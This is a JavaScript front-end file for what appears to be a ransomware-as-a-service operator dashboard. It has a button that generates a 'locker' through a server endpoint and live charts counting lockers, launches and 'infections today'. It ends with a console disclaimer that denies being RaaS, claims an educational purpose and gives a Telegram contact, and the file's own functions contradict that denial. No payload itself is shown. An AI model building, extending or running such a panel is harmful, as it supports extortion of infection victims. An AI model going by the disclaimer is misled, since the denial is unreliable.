let launchChartInstance = null;
let lockersChartInstance = null;
let launchesChartInstance = null;
let infectionsChartInstance = null;

document.getElementById("create-locker").addEventListener("click", async () => {
    try {
        const response = await fetch('/generate-locker', { method: 'POST' });
        if (!response.ok) {
            throw new Error('Failed to generate locker');
        }
        const result = await response.text(); 
        showLockerModal(result); 
    } catch (error) {
        console.error('Error generating locker:', error);
        alert('Failed to generate locker. Please try again.');
    }
});

function showLockerModal(message) {
    const modal = document.getElementById("locker-modal");
    const lockerMessageElement = document.getElementById("locker-message");

    lockerMessageElement.textContent = message;

    modal.style.display = "flex";

    document.getElementById("close-locker-modal").addEventListener("click", () => {
        modal.style.display = "none";
    });
}

async function loadDashboard() {
    const response = await fetch('/dashboard-data');
    const data = await response.json();
    document.getElementById('total-lockers').innerText = data.total_lockers || '-';
    document.getElementById('total-launches').innerText = data.total_launches || '-';
    document.getElementById('infections-today').innerText = data.infections_today || '-';
}

async function loadGraphData() {
    const response = await fetch('/graph-data');
    const graphData = await response.json();

    if (launchChartInstance) {
        launchChartInstance.destroy();
    }

    const ctx = document.getElementById('launch-chart').getContext('2d');
    launchChartInstance = new Chart(ctx, {
        type: 'bar',
        data: {
            labels: graphData.labels.map(label =>
                new Date(label).toLocaleDateString('en-GB', { day: '2-digit', month: 'short' })
            ),
            datasets: [
                {
                    label: 'Launches',
                    data: graphData.data,
                    backgroundColor: '#3b82f6',
                    borderRadius: 10,
                    barThickness: 20,
                },
            ],
        },
        options: {
            responsive: true,
            plugins: { legend: { display: false } },
            scales: {
                x: { grid: { display: false }, ticks: { color: '#fff' } },
                y: { grid: { color: '#444' }, ticks: { color: '#fff' }, beginAtZero: true },
            },
        },
    });
}

async function loadMiniGraphs() {
    const response = await fetch('/mini-graphs-data');
    const miniGraphData = await response.json();

    const chartOptions = {
        type: 'line',
        options: {
            responsive: true,
            plugins: { legend: { display: false } },
            scales: { x: { display: false }, y: { display: false } },
            elements: { line: { tension: 0.4 }, point: { radius: 0 } },
        },
    };

    if (lockersChartInstance) lockersChartInstance.destroy();
    if (launchesChartInstance) launchesChartInstance.destroy();
    if (infectionsChartInstance) infectionsChartInstance.destroy();

    lockersChartInstance = new Chart(document.getElementById('total-lockers-chart').getContext('2d'), {
        ...chartOptions,
        data: {
            labels: miniGraphData.lockers.labels,
            datasets: [
                {
                    data: miniGraphData.lockers.data,
                    borderColor: '#3b82f6',
                    backgroundColor: 'rgba(59, 130, 246, 0.2)',
                },
            ],
        },
    });

    launchesChartInstance = new Chart(document.getElementById('total-launches-chart').getContext('2d'), {
        ...chartOptions,
        data: {
            labels: miniGraphData.launches.labels,
            datasets: [
                {
                    data: miniGraphData.launches.data,
                    borderColor: '#10b981',
                    backgroundColor: 'rgba(16, 185, 129, 0.2)',
                },
            ],
        },
    });

    infectionsChartInstance = new Chart(document.getElementById('infections-today-chart').getContext('2d'), {
        ...chartOptions,
        data: {
            labels: miniGraphData.infections.labels,
            datasets: [
                {
                    data: miniGraphData.infections.data,
                    borderColor: '#ef4444',
                    backgroundColor: 'rgba(239, 68, 68, 0.2)',
                },
            ],
        },
    });
}

setInterval(() => {
    loadDashboard();
    loadGraphData();
    loadMiniGraphs();
}, 3000);

window.onload = () => {
    loadDashboard();
    loadGraphData();
    loadMiniGraphs();
};

document.getElementById("chat-btn").addEventListener("click", () => {
    const modal = document.getElementById("chat-modal");
    modal.classList.remove("hidden");
});

document.getElementById("close-modal").addEventListener("click", () => {
    const modal = document.getElementById("chat-modal");
    modal.classList.add("hidden");
});


console.log(`
    ========================================================
    DISCLAIMER:
    This project is developed and distributed strictly for 
    educational and ethical purposes. It is intended to 
    provide developers and researchers with insights into 
    cybersecurity and software development practices.

    THIS IS NOT RANSOMWARE-AS-A-SERVICE (RaaS):
    - This project is NOT designed, intended, or allowed to be 
      used for malicious purposes, illegal activities, or 
      unauthorized hacking.
    - The source code is provided for research and learning 
      only and does not include any operational deployment tools.

    NOTICE TO LAW ENFORCEMENT AND GITHUB:
    - The repository does NOT offer pre-built tools or 
      services that could be used in RaaS.
    - Any misuse of this project by third parties is beyond the 
      developer's responsibility and violates the intended use.

    CONTACT:
    For further inquiries, or to report misuse of this project, 
    contact the developer directly via Telegram @codepulze.

    ========================================================
`);